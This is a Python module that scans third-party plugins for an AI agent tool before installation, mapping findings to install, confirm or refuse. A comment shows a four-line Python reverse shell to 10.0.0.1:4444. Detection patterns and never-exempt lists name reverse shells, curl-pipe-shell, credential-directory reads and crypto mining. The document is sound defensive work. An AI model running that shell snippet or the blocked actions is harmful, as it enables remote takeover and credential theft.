"""A security scan for plugins you did not write.

`andromeda plugins install` clones a git repository and, once enabled, imports
it into this process. Skills already get screened before the model reads them
(`skill_scan`); a plugin is strictly more dangerous than a skill, because a
skill is text the model may act on and a plugin is code the interpreter runs.
Installing one unscanned when the machinery already exists would be an odd
place to stop.

So this reuses `skill_scan`'s 119-pattern engine, with three adjustments a
plugin needs and a skill does not.

**A plugin is a program.** The skill scanner's structural limits — 50 files,
1MB — describe instructions. They are raised here, and a plugin over the new
limits is reported rather than refused: "too many files" is not a threat.

**Code files lose the "reads its own secret" family.** The documented way to
write a provider plugin is to declare `requires_env: [ACME_API_KEY]`, read that
variable, and send it to the vendor over HTTPS. That is `python_getenv_secret`
plus `env_exfil_httpx` — two criticals — on every legitimate provider plugin
that will ever exist. A scanner that flags all of them is a scanner whose
output people learn to skip, which costs more than it saves. The exemption is
narrow and enumerated below, it applies only to code files, and it never
touches a *foreign* credential store: reading `~/.aws` or this program's own
credentials file is still critical, in every file, always.

**Documentation and config keep the whole ruleset.** Prompt injection and
social engineering live in README files, not in Python. `plugin.yaml`,
`*.md` and `*.txt` are scanned with nothing exempted.

Verdict to policy:

    safe        install
    caution     warn, and require an explicit yes (or --force)
    dangerous   refuse — and --force does not override it

The last line is the one worth defending. A `--force` that gets past a
reverse shell makes the whole scan advisory, and an advisory scan on code that
is about to be imported into the agent's own process is theatre.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from pathlib import Path
from typing import Iterable

from andromeda_tools import skill_scan

SCANNER_VERSION = "plugin-scan-v1"

#: A plugin is a program, so these are program-sized. Exceeding one is
#: reported as a low finding — informational, never a block.
MAX_FILE_COUNT = 400
MAX_TOTAL_SIZE_KB = 8 * 1024
MAX_SINGLE_FILE_KB = 1024

#: Never walked. A vendored dependency tree is not what the person is being
#: asked to trust, and scanning one produces hundreds of findings about code
#: that a lockfile already pins.
SKIP_DIRECTORIES = frozenset(
    {
        ".git",
        ".hg",
        ".svn",
        ".venv",
        "venv",
        "node_modules",
        "__pycache__",
        ".mypy_cache",
        ".pytest_cache",
        ".ruff_cache",
        "dist",
        "build",
        ".tox",
        ".eggs",
    }
)

#: Files scanned with the full ruleset — nothing exempted. Injection and
#: social engineering live in prose, so prose gets no benefit of the doubt.
DOCUMENTATION_SUFFIXES = frozenset({".md", ".txt", ".rst", ".yaml", ".yml", ".json"})
DOCUMENTATION_NAMES = frozenset(
    {"plugin.yaml", "readme", "readme.md", "license", "install.md", "after-install.md"}
)

#: Findings dropped on *code* files only, because each one fires on the
#: documented way to write a provider plugin: declare `requires_env`, read that
#: variable, send it to your vendor.
#:
#: Enumerated by id rather than by category, on purpose. `exfiltration` also
#: contains `ssh_dir_access` and `andromeda_credentials`, and exempting the
#: category would take those with it — which is precisely the hole a plugin
#: scanner must not have.
CODE_EXEMPT_PATTERN_IDS: frozenset[str] = frozenset(
    {
        # An HTTP call carrying the plugin's own key. This IS the job.
        "env_exfil_curl",
        "env_exfil_wget",
        "env_exfil_fetch",
        "env_exfil_requests",
        "env_exfil_httpx",
        # Reading its own declared environment variable.
        "python_os_environ",
        "python_environ_get_secret",
        "python_getenv_secret",
        "node_process_env",
        "ruby_env_secret",
    }
)

#: The exemption above is a promise that these still fire everywhere. Asserted
#: by `tests/test_plugin_guard.py::test_foreign_credential_access_is_never_exempt`
#: so nobody can widen the list into a category and take these with it.
NEVER_EXEMPT: frozenset[str] = frozenset(
    {
        "ssh_dir_access",
        "aws_dir_access",
        "gpg_dir_access",
        "kube_dir_access",
        "docker_dir_access",
        "andromeda_credentials",
        "read_secrets_file",
        "reverse_shell",
        "bash_reverse_shell",
        "python_socket_oneliner",
        "curl_pipe_shell",
        "wget_pipe_shell",
        "curl_pipe_python",
        "destructive_root_rm",
        "destructive_home_rm",
        "ssh_backdoor",
        "sudoers_mod",
        "andromeda_config_mod",
        "crypto_mining",
        "embedded_private_key",
        "hardcoded_secret",
        "stdio_onto_socket",
        "pty_spawn",
        "interactive_shell_spawn",
    }
)


#: Patterns the skill ruleset does not have, because a skill does not need
#: them. `skill_scan` catches a reverse shell written as a *command* —
#: `nc -l`, `/bin/sh -i >/dev/tcp/`, `python -c "import socket`. A plugin is
#: executable Python, so the natural way to write one there is four ordinary
#: lines that match none of those:
#:
#:     s = socket.socket(...)
#:     s.connect(("10.0.0.1", 4444))
#:     os.dup2(s.fileno(), 0)
#:     subprocess.call(["/bin/sh", "-i"])
#:
#: That scored `safe` until a test wrote it out. These close it. Each one is a
#: shape with no legitimate use inside a plugin — none of them is "provider
#: plugins do this and it looks alarming", which is the class the exemption
#: list above exists for.
#:
#: (regex, id, severity, category, description)
PLUGIN_THREAT_PATTERNS: tuple[tuple[str, str, str, str, str], ...] = (
    (
        r"os\.dup2\s*\(\s*[\w.]+\.fileno\s*\(",
        "stdio_onto_socket",
        "critical",
        "network",
        "redirects this process's input or output onto a socket",
    ),
    (
        r"pty\.spawn\s*\(",
        "pty_spawn",
        "critical",
        "network",
        "spawns an interactive terminal under program control",
    ),
    (
        r"(?:subprocess\.(?:call|run|Popen)|os\.execv?p?)\s*\(\s*\[?\s*"
        r"[\"']/bin/(?:ba|z|k)?sh[\"']\s*,\s*[\"']-i[\"']",
        "interactive_shell_spawn",
        "critical",
        "network",
        "spawns an interactive shell",
    ),
    (
        r"socket\.socket\s*\([^)]*\)[\s\S]{0,200}?\.connect\s*\(\s*\(",
        "outbound_raw_socket",
        "high",
        "network",
        "opens a raw outbound socket to a fixed address",
    ),
)

PLUGIN_COMPILED = tuple(
    (re.compile(pattern, re.IGNORECASE), pid, severity, category, description)
    for pattern, pid, severity, category, description in PLUGIN_THREAT_PATTERNS
)


def scan_plugin_patterns(text: str, rel_path: str) -> list[skill_scan.Finding]:
    """The plugin-only rules, over one file's text."""
    findings: list[skill_scan.Finding] = []
    for compiled, pid, severity, category, description in PLUGIN_COMPILED:
        for match in compiled.finditer(text):
            line = text.count("\n", 0, match.start()) + 1
            findings.append(
                skill_scan.Finding(
                    pattern_id=pid,
                    severity=severity,
                    category=category,
                    file=rel_path,
                    line=line,
                    match=match.group(0)[:80],
                    description=description,
                )
            )
            # One finding per pattern per file. A loop that opened ten sockets
            # is not ten times the problem, and ten identical lines in a report
            # is a report nobody reads to the end of.
            break
    return findings


@dataclass
class PluginScan:
    """What the scan found, and what it means for installing."""

    name: str
    verdict: str  # "safe" | "caution" | "dangerous"
    findings: list[skill_scan.Finding]
    files_scanned: int
    content_hash: str = ""

    @property
    def decision(self) -> str:
        """"allow", "confirm" or "block"."""
        if self.verdict == "dangerous":
            return "block"
        if self.verdict == "caution":
            return "confirm"
        return "allow"

    @property
    def worst(self) -> skill_scan.Finding | None:
        if not self.findings:
            return None
        return sorted(
            self.findings,
            key=lambda item: skill_scan.SEVERITY_ORDER.get(item.severity, 4),
        )[0]

    def summary(self) -> str:
        if not self.findings:
            return f"{self.verdict} — nothing found in {self.files_scanned} files"
        count = len(self.findings)
        plural = "" if count == 1 else "s"
        categories = sorted({finding.category for finding in self.findings})
        return (
            f"{self.verdict} — {count} finding{plural} in "
            f"{', '.join(categories)} across {self.files_scanned} files"
        )


def is_documentation(path: Path) -> bool:
    """Whether a file gets the unexempted ruleset."""
    name = path.name.lower()
    if name in DOCUMENTATION_NAMES:
        return True
    return path.suffix.lower() in DOCUMENTATION_SUFFIXES


def _iter_files(directory: Path) -> Iterable[Path]:
    for path in sorted(directory.rglob("*")):
        if not path.is_file() or path.is_symlink():
            continue
        if any(part in SKIP_DIRECTORIES for part in path.relative_to(directory).parts):
            continue
        yield path


def scan_plugin(directory: Path, name: str = "") -> PluginScan:
    """Scan an unpacked plugin directory.

    Never raises on a bad file: an unreadable or undecodable file contributes
    nothing rather than aborting the scan, because a scan that dies halfway
    reports "safe" for everything it did not reach.
    """
    root = Path(directory)
    plugin_name = name or root.name

    findings: list[skill_scan.Finding] = []
    scanned = 0
    total_bytes = 0
    oversized: list[str] = []

    for path in _iter_files(root):
        relative = path.relative_to(root).as_posix()
        try:
            size = path.stat().st_size
        except OSError:
            continue
        total_bytes += size

        if size > MAX_SINGLE_FILE_KB * 1024:
            oversized.append(relative)
            continue
        if path.suffix.lower() in skill_scan.BINARY_EXTENSIONS:
            findings.append(
                skill_scan.Finding(
                    pattern_id="binary_file",
                    severity="high",
                    category="structure",
                    file=relative,
                    line=0,
                    match=path.suffix,
                    description="ships a compiled binary, which cannot be reviewed",
                )
            )
            continue
        if path.suffix.lower() not in skill_scan.SCANNABLE_EXTENSIONS:
            continue

        scanned += 1
        try:
            found = skill_scan.scan_file(path, relative)
        except Exception:  # noqa: BLE001 - one unreadable file is not the scan
            continue

        if not is_documentation(path):
            found = [
                item for item in found if item.pattern_id not in CODE_EXEMPT_PATTERN_IDS
            ]
            try:
                found.extend(scan_plugin_patterns(path.read_text(encoding="utf-8"), relative))
            except (OSError, UnicodeDecodeError):
                pass
        findings.extend(found)

    for relative in oversized:
        findings.append(
            skill_scan.Finding(
                pattern_id="oversized_file",
                severity="low",
                category="structure",
                file=relative,
                line=0,
                match=f">{MAX_SINGLE_FILE_KB}KB",
                description="too large to scan, so its contents were not reviewed",
            )
        )
    if scanned > MAX_FILE_COUNT:
        findings.append(
            skill_scan.Finding(
                pattern_id="file_count",
                severity="low",
                category="structure",
                file="",
                line=0,
                match=str(scanned),
                description=f"more than {MAX_FILE_COUNT} scannable files",
            )
        )
    if total_bytes > MAX_TOTAL_SIZE_KB * 1024:
        findings.append(
            skill_scan.Finding(
                pattern_id="total_size",
                severity="low",
                category="structure",
                file="",
                line=0,
                match=f"{total_bytes // 1024}KB",
                description=f"larger than {MAX_TOTAL_SIZE_KB}KB in total",
            )
        )

    return PluginScan(
        name=plugin_name,
        verdict=skill_scan.verdict_for(findings),
        findings=findings,
        files_scanned=scanned,
        content_hash=skill_scan.content_hash(root),
    )


def format_report(scan: PluginScan, limit: int = 10) -> str:
    """The findings, worst first, as lines a person can act on."""
    if not scan.findings:
        return f"{scan.name}: {scan.summary()}"

    ordered = sorted(
        scan.findings,
        key=lambda item: (
            skill_scan.SEVERITY_ORDER.get(item.severity, 4),
            item.file,
            item.line,
        ),
    )
    lines = [f"{scan.name}: {scan.summary()}"]
    for finding in ordered[:limit]:
        where = f"{finding.file}:{finding.line}" if finding.file else "(structure)"
        lines.append(
            f"  [{finding.severity}] {finding.description} — {where}"
        )
    remaining = len(ordered) - limit
    if remaining > 0:
        lines.append(f"  … and {remaining} more")
    return "\n".join(lines)


def refusal(scan: PluginScan) -> str:
    """Why an install is being refused, in one line."""
    worst = scan.worst
    detail = ""
    if worst is not None:
        where = f" ({worst.file}:{worst.line})" if worst.file else ""
        detail = f" — {worst.description}{where}"
    return (
        f"{scan.name} was not installed: the security scan came back "
        f"{scan.verdict}{detail}. This is not overridable with --force."
    )
